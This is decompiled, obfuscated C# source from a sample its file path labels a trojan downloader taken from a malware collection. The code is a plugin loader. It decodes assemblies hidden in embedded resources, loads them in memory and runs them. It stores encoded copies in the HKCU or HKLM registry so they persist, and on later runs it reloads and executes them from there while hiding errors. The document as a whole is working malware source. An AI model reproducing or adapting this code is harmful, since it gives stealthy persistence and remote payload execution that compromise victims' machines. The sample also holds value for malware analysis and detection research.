// Decompiled with JetBrains decompiler
// Type: ᥟޱഁेࠃᵷᣚ.bֲᶋ
// Assembly: lgy, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F6858297-EDCC-46A7-BF64-CBC6BE6B3CD4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Downloader.MSIL.Crypted.ej-8021b1adb21670f837224cd99ccee8599abd7a84c7c3cf7b87df9da753a7739c.exe

using Microsoft.Win32;
using Plugin;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;

namespace ᥟޱഁेࠃᵷᣚ
{
  public class bֲᶋ
  {
    public static SortedList<Guid, byte[]> \u0658ൊ\u136BȤÐ\u0BD9ݵ\u00A0ᥣ = new SortedList<Guid, byte[]>();
    public static SortedList<Guid, IPlugin> \u0EBAឯᐗ̧ฅ = new SortedList<Guid, IPlugin>();
    private static string ᧆᕝ\u0831Ǫ᪱\u0F1Bؒ\u1CB5 = string.Empty;

    public static event bֲᶋ.ጇȾྂᘍ ᬍᶭੳᷱ੯\u1CFF;

    public static void \u06DFṭ()
    {
      try
      {
        BinaryFormatter binaryFormatter = new BinaryFormatter();
        MemoryStream serializationStream = new MemoryStream();
        binaryFormatter.Serialize((Stream) serializationStream, (object) bֲᶋ.\u0658ൊ\u136BȤÐ\u0BD9ݵ\u00A0ᥣ);
        serializationStream.Close();
        byte[] numArray = ґ.êᰉ\u0EA4(serializationStream.ToArray(), false);
        if (ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.\u05C5\u066CҼƹߛƹ == RegistryHive.CurrentUser)
          Registry.CurrentUser.CreateSubKey(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᒳኣˋୣʎ\u1249ᯋĢ).SetValue(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᡀ\u0EA4, (object) numArray);
        else
          Registry.LocalMachine.CreateSubKey(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᒳኣˋୣʎ\u1249ᯋĢ).SetValue(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᡀ\u0EA4, (object) numArray);
      }
      catch
      {
      }
    }

    public static void \u082Aᨫ() => new Thread((ThreadStart) (() =>
    {
      try
      {
        BinaryFormatter binaryFormatter = new BinaryFormatter();
        MemoryStream memoryStream;
        byte[] numArray;
        if (ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.\u05C5\u066CҼƹߛƹ == RegistryHive.CurrentUser)
        {
          MemoryStream serializationStream = new MemoryStream(ґ.ᢝҳᔏ\u0C54ᇗᎶᓠয̙(Registry.CurrentUser.CreateSubKey(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᒳኣˋୣʎ\u1249ᯋĢ).GetValue(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᡀ\u0EA4) as byte[], false));
          bֲᶋ.\u0658ൊ\u136BȤÐ\u0BD9ݵ\u00A0ᥣ = binaryFormatter.Deserialize((Stream) serializationStream) as SortedList<Guid, byte[]>;
          serializationStream.Close();
          serializationStream.Dispose();
          memoryStream = (MemoryStream) null;
          numArray = (byte[]) null;
        }
        else
        {
          MemoryStream serializationStream = new MemoryStream(ґ.ᢝҳᔏ\u0C54ᇗᎶᓠয̙(Registry.LocalMachine.CreateSubKey(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᒳኣˋୣʎ\u1249ᯋĢ).GetValue(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᡀ\u0EA4) as byte[], false));
          bֲᶋ.\u0658ൊ\u136BȤÐ\u0BD9ݵ\u00A0ᥣ = binaryFormatter.Deserialize((Stream) serializationStream) as SortedList<Guid, byte[]>;
          serializationStream.Close();
          serializationStream.Dispose();
          memoryStream = (MemoryStream) null;
          numArray = (byte[]) null;
        }
        foreach (byte[] Ꮲభி႖ቧ in (IEnumerable<byte[]>) bֲᶋ.\u0658ൊ\u136BȤÐ\u0BD9ݵ\u00A0ᥣ.Values)
          bֲᶋ.ᠣ\u0863֢੧Ἦ(Ꮲభி႖ቧ);
      }
      catch
      {
      }
    })).Start();

    public static void ग़\u0C5C\u1394ፋ᧗\u17EF᭰Ϳ() => new Thread((ThreadStart) (() =>
    {
      try
      {
        if (Assembly.GetExecutingAssembly().GetManifestResourceNames().Length == 0)
          return;
        ResourceManager resourceManager = new ResourceManager("p", Assembly.GetExecutingAssembly());
        int num = (int) resourceManager.GetObject("Len");
        for (int index = 0; index < num; ++index)
        {
          byte[] Ꮲభி႖ቧ = (byte[]) resourceManager.GetObject(index.ToString());
          Array.Reverse((Array) Ꮲభி႖ቧ);
          bֲᶋ.ᠣ\u0863֢੧Ἦ(Ꮲభி႖ቧ);
        }
        if (!ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ൺግ)
          return;
        bֲᶋ.\u06DFṭ();
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    })).Start();

    public static bool ᠣ\u0863֢੧Ἦ(byte[] Ꮲభி႖ቧ)
    {
      try
      {
        foreach (Type type in Assembly.Load(Ꮲభி႖ቧ).GetTypes())
        {
          int num = 0;
          if (type.IsClass && type.IsSubclassOf(typeof (IPlugin)))
          {
            IPlugin instance = (IPlugin) Activator.CreateInstance(type);
            if (instance.ExecuteOnLoad)
            {
              instance.Initialize();
              bֲᶋ.պ႖\u0CD3ᦜভᜬڳ((object) null, instance, instance.ExecuteOnLoadArgs);
            }
            if (!bֲᶋ.\u0658ൊ\u136BȤÐ\u0BD9ݵ\u00A0ᥣ.ContainsKey(instance.Guid))
              bֲᶋ.\u0658ൊ\u136BȤÐ\u0BD9ݵ\u00A0ᥣ.Add(instance.Guid, Ꮲభி႖ቧ);
            else
              ++num;
            if (!bֲᶋ.\u0EBAឯᐗ̧ฅ.ContainsKey(instance.Guid))
              bֲᶋ.\u0EBAឯᐗ̧ฅ.Add(instance.Guid, instance);
            else
              ++num;
            bֲᶋ.ᧆᕝ\u0831Ǫ᪱\u0F1Bؒ\u1CB5 = string.Empty;
            if (num == 2)
            {
              bֲᶋ.ᧆᕝ\u0831Ǫ᪱\u0F1Bؒ\u1CB5 = instance.Name + ґ.ᖢ("gWeIs7msqKtHDG9PwGeau7a5rKs=", true);
              return false;
            }
            if (bֲᶋ.ᕂᨭ֩\u0EECᶥ\u0C49\u136Eѥܖ != null)
              bֲᶋ.ᕂᨭ֩\u0EECᶥ\u0C49\u136Eѥܖ((object) null, instance);
            return true;
          }
        }
        bֲᶋ.ᧆᕝ\u0831Ǫ᪱\u0F1Bؒ\u1CB5 = ґ.ᖢ("eKGWqKhVrJ6pnVV+haGqnJ6jVTU/EsSeo6map5uWmJpVo6SpVZukqqOZYw==", true);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
        bֲᶋ.ᧆᕝ\u0831Ǫ᪱\u0F1Bؒ\u1CB5 = ex.Message;
      }
      return false;
    }

    public static bool Ꮻʛၯ(IPlugin _param0)
    {
      if (!bֲᶋ.\u0EBAឯᐗ̧ฅ.ContainsKey(_param0.Guid))
      {
        bֲᶋ.\u0EBAឯᐗ̧ฅ.Add(_param0.Guid, _param0);
        bֲᶋ.ᧆᕝ\u0831Ǫ᪱\u0F1Bؒ\u1CB5 = string.Empty;
        if (bֲᶋ.ᕂᨭ֩\u0EECᶥ\u0C49\u136Eѥܖ != null)
          bֲᶋ.ᕂᨭ֩\u0EECᶥ\u0C49\u136Eѥܖ((object) null, _param0);
        return true;
      }
      bֲᶋ.ᧆᕝ\u0831Ǫ᪱\u0F1Bؒ\u1CB5 = _param0.Name + ґ.ᖢ("gWeIs7msqKtHDG9PwGeau7a5rKs=", true);
      return false;
    }

    public static void \u05FCθ͍ᖘ\u08C4ᜰ\u17FE༨(Guid _param0)
    {
      if (!bֲᶋ.\u0EBAឯᐗ̧ฅ.ContainsKey(_param0))
        return;
      bֲᶋ.\u0658ൊ\u136BȤÐ\u0BD9ݵ\u00A0ᥣ.Remove(_param0);
      bֲᶋ.\u0EBAឯᐗ̧ฅ.Remove(_param0);
    }

    public static string ᣖ\u135Bঝ() => bֲᶋ.ᧆᕝ\u0831Ǫ᪱\u0F1Bؒ\u1CB5;

    public static void պ႖\u0CD3ᦜভᜬڳ(object _param0, IPlugin _param1, PluginArgs ᨁᣇᦪʾߒஞ) => new Thread((ThreadStart) (() =>
    {
      try
      {
        _param1.Execute(_param0, ᨁᣇᦪʾߒஞ);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    })).Start();

    public static void \u0BFBᷛἣಠỠ()
    {
      try
      {
        if (!ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ൺግ)
          return;
        if (ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.\u05C5\u066CҼƹߛƹ == RegistryHive.CurrentUser)
          Registry.CurrentUser.CreateSubKey(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᒳኣˋୣʎ\u1249ᯋĢ).DeleteValue(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᡀ\u0EA4);
        else
          Registry.LocalMachine.CreateSubKey(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᒳኣˋୣʎ\u1249ᯋĢ).DeleteValue(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᡀ\u0EA4);
      }
      catch
      {
      }
    }

    public delegate void ጇȾྂᘍ(object sender, IPlugin plugin);
  }
}
